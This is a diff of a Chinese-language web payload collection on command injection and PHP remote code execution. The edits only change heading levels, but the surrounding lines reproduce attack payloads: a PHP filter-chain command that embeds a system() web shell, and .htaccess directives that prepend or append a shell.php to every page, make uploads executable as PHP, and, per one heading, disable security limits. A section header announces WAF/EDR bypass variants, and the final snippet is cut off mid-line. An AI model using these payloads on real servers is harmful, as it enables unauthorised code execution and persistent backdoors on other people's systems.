@@ -2,7 +2,7 @@
 
 _12 条 web payload_
 
-### 命令注入  `rce-command-injection`
+## 命令注入  `rce-command-injection`
 _操作系统命令注入攻击技术_
 子类：**命令注入** · tags: `rce` `command` `injection` `os`
 
@@ -303,7 +303,7 @@ python3 php_filter_chain_generator.py --chain "<?php system($_GET[cmd]);?>"
 - ` 使用php_filter_chain_generator
 python3 php_filter_chain_generator.py --chain "<?php system($_GET[cmd]);?>"
 
-# 输出可直接使用的Filter链` — 参数与载荷内容 _value_
+## 输出可直接使用的Filter链` — 参数与载荷内容 _value_
 
 **4. 完整利用示例**
 > 完整Filter链示例
@@ -1237,7 +1237,7 @@ php_value auto_append_file /var/www/html/shell.php
 - ` 自动在每个文件前包含
 php_value auto_prepend_file /var/www/html/shell.php
 
-# 自动在每个文件后包含
+## 自动在每个文件后包含
 php_value auto_append_file /var/www/html/shell.php` — 参数与载荷内容 _value_
 
 **3. 伪静态RCE**
@@ -1257,7 +1257,7 @@ SetHandler application/x-httpd-php
 RewriteEngine on
 RewriteRule ^(.*)$ $1 [L]
 
-# 更危险的配置
+## 更危险的配置
 SetHandler application/x-httpd-php` — 参数与载荷内容 _value_
 
 **4. 错误页面包含**
@@ -1289,7 +1289,7 @@ php_flag display_errors on
 - `# 设置include路径
 php_value include_path "/var/www/html/uploads"
 
-# 禁用安全限制
+## 禁用安全限制
 php_f` — 攻击载荷 _value_
 
 **WAF/EDR 绕过变体：**
